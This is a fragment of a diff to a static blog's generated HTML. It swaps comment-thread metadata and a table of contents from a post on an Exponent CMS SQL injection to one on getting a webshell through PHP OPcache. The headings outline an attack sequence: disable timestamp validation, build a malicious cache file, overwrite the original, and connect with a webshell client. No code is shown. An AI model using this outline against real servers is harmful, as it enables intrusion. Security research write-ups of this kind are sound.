-      <div class="ds-thread" data-thread-key="2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/"
-           data-title="[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析" data-url="http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/">
+      <div class="ds-thread" data-thread-key="2017/05/13/利用PHP的OPcache机制getshell/"
+           data-title="利用PHP的OPcache机制getshell" data-url="http://yoursite.com/2017/05/13/利用PHP的OPcache机制getshell/">
       </div>
     
   </div>
@@ -604,7 +628,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞"><span class="nav-number">1.</span> <span class="nav-text">漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-number">2.</span> <span class="nav-text">POC</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于OPcache"><span class="nav-number">1.</span> <span class="nav-text">关于OPcache</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境配置"><span class="nav-number">2.</span> <span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php版本"><span class="nav-number">2.1.</span> <span class="nav-text">php版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置OPcache"><span class="nav-number">2.2.</span> <span class="nav-text">配置OPcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开启OPcache"><span class="nav-number">2.2.1.</span> <span class="nav-text">开启OPcache</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭时间戳验证"><span class="nav-number">2.2.2.</span> <span class="nav-text">关闭时间戳验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置OPcache缓存路径"><span class="nav-number">2.2.3.</span> <span class="nav-text">设置OPcache缓存路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#设置缓存文件优先级"><span class="nav-number">2.2.4.</span> <span class="nav-text">设置缓存文件优先级</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#重启apache"><span class="nav-number">2.2.5.</span> <span class="nav-text">重启apache</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#www目录"><span class="nav-number">2.3.</span> <span class="nav-text">www目录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#index-php"><span class="nav-number">2.3.1.</span> <span class="nav-text">index.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upload-file-php"><span class="nav-number">2.3.2.</span> <span class="nav-text">upload-file.php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpinfo-php"><span class="nav-number">2.3.3.</span> <span class="nav-text">phpinfo.php</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#getshell"><span class="nav-number">3.</span> <span class="nav-text">getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用phpinfo获取信息"><span class="nav-number">3.1.</span> <span class="nav-text">利用phpinfo获取信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php7-opcache-override-py"><span class="nav-number">3.2.</span> <span class="nav-text">php7-opcache-override.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构建恶意的缓存文件"><span class="nav-number">3.3.</span> <span class="nav-text">构建恶意的缓存文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#覆盖原缓存文件"><span class="nav-number">3.4.</span> <span class="nav-text">覆盖原缓存文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#菜刀连上"><span class="nav-number">3.5.</span> <span class="nav-text">菜刀连上</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-number">4.</span> <span class="nav-text">CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ASIS-CTF-2016-–-BinaryCloud"><span class="nav-number">4.1.</span> <span class="nav-text">ASIS CTF 2016 – BinaryCloud</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ALICTF-2016-homework"><span class="nav-number">4.2.</span> <span class="nav-text">ALICTF 2016  - homework</span></a></li></ol></li></ol></div>
             
 
           </div>
